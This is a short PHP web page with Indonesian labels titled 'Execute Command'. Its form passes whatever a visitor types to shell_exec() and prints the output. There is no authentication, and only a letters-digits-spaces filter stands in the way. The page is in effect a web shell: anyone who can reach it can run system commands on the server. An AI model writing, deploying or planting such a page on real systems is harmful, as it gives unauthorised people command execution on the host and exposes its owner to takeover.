<!DOCTYPE html>
<html>
<head>
    <title>Execute Command</title>
</head>
<body>
    <h1>Execute Command</h1>
    <form method="post">
        <label for="command">Masukkan perintah:</label>
        <input type="text" name="command" id="command">
        <input type="submit" value="Jalankan">
    </form>

    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Ambil perintah dari input form
        $command = $_POST['command'];

        // Pastikan perintah hanya berisi karakter yang diperbolehkan
        if (preg_match('/^[a-zA-Z0-9\s]+$/', $command)) {
            // Jalankan perintah
            $output = shell_exec($command);
            echo "<pre>$output</pre>";
        } else {
            echo "Perintah tidak valid!";
        }
    }
    ?>
</body>
</html>
